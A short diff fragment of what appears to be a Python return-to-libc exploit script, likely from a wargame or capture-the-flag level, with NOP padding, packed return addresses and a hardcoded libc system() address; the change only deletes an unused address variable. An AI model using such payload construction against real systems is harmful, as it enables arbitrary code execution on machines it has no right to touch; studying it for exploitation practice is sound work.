@@ -5,7 +5,7 @@ padding = "\x90" * 80
 
 p_return_adress = 0x0804853e
 main_return_adress = 0x0804854b
-random_adress = 0x08048538
+
 ret_adress = str(struct.pack("I", p_return_adress))
 system = str(struct.pack("I", 0xb7e6b060))
 returnAfterSystem = str(struct.pack("I", 0xb7e5ebe0))
